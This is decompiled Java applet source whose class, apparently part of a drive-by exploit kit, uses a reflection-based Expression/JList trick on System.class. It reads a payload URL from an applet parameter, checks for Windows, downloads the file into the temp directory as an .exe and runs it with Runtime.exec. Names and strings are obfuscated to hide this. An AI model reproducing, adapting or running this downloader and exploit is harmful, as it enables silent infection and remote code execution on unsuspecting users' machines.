// 
// Decompiled by Procyon v0.5.30
// 

package pocket;

import java.awt.Component;
import java.beans.Expression;
import menu.help;
import menu.file;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class object3 extends Applet
{
    public String xaxy;
    public Runtime lwlq;
    public int hyhvpi;
    public String xaxx;
    public HashSet hyhq;
    public JList hyhy;
    public String xaxq;
    public String hyhe;
    public URL hyhb;
    public String hyha;
    public String hyhz;
    public InputStream hyhx;
    public String hyhc;
    public int hyhv;
    public FileOutputStream hyhn;
    public String hyhm;
    public String hyhs;
    public String hyhd;
    public String xaxa;
    static Class lwla;
    static Object[] lwlf;
    
    static {
        object3.lwla = System.class;
        object3.lwlf = new Object[1];
    }
    
    private void karamba() {
        object.prepar(this.hyhb, object4.kicker(String.valueOf(object4.p4) + object4.p3 + object4.p1));
        final int hyhq = 61;
        final String xaxc = "fae";
        this.hyhx = (InputStream)object.prepar(this.hyhb, object4.kicker(String.valueOf(object4.p2) + object4.p1));
    }
    
    private String liver(final String s) {
        return System.getProperty(s);
    }
    
    private void paprika() throws Exception {
        final boolean xaxz = false;
        this.hyhn = new FileOutputStream(this.xaxa);
        final int hyhr = 12;
    }
    
    private void tabarda(final Object o) {
        object.prepar(o, object4.kicker(object4.p10));
    }
    
    public void start() {
        super.start();
        try {
            this.xaxy = "e".concat("xe.");
            this.xaxx = object4.kicker(String.valueOf(object4.p6) + object4.kicker(object4.p5) + "." + object4.p9 + "." + object4.p7 + object4.kicker(object4.p8));
            this.xaxq = file.pirko(this.getParameter("biint"));
            this.hyhe = "ema".concat("n.".concat("so"));
            this.hyha = object4.kicker(this.xaxy);
            this.hyhb = new URL(this.xaxq);
            this.hyhz = object4.kicker(this.xaxx);
            this.hyhvpi = 24;
            this.hyhc = object4.kicker(this.hyhe);
            this.hyhm = object4.batr(this.hyha);
            final Runtime runtime = Runtime.getRuntime();
            this.lwlq = runtime;
            if (runtime == null) {}
            this.hyhs = this.liver(this.hyhz);
            final int i = 11;
            this.hyhd = this.liver(this.hyhc);
            final int k = 5;
            this.xaxa = String.valueOf(this.hyhs) + this.hyhm;
            final int j = 23;
            this.hyhv = 1000 + this.hyhvpi;
            try {
                if (this.hyhd.indexOf("W".concat("in").concat("do".concat("ws"))) < 0) {
                    return;
                }
                this.paprika();
                this.karamba();
                final String xaxk = "ara";
                final byte[] xaxl = new byte[this.hyhv];
                int xaxm;
                while ((xaxm = this.hyhx.read(xaxl, 0, this.hyhv)) != -1) {
                    this.hyhn.write(xaxl, 0, xaxm);
                }
                this.tabarda(this.hyhx);
                final String xaxp = "iord";
                final int xaxn = 47;
                final boolean xaxo = false;
                this.tabarda(this.hyhn);
                final int xaxq = 12;
                final String xaxr = "liko";
                final boolean xaxs = true;
                object.prepar(this.lwlq, object4.ito(), new Object[] { String.valueOf(this.hyhs) + this.hyhm });
                final int xaxu = 18;
                final String xaxy = "lki";
            }
            catch (Exception pyp) {
                pyp.printStackTrace();
            }
        }
        catch (Exception pyp2) {
            pyp2.printStackTrace();
        }
    }
    
    public object3() {
        this.hyhq = new HashSet();
        object4.piska();
        final boolean lwlb = true;
        final int lwlm = 31;
        final String lwld = "pcr";
        this.hyhq.add(new help(object3.lwla, object4.lwlc, object3.lwlf));
        final int lwlg = 27;
        final Expression lwlh = new Expression(object3.lwla, object4.lwlc, object3.lwlf);
        final boolean lwlu = true;
        final object2 lwlj = new object2(this, this.hyhq);
        this.add(this.hyhy = new JList((E[])new Object[] { lwlj }));
    }
}
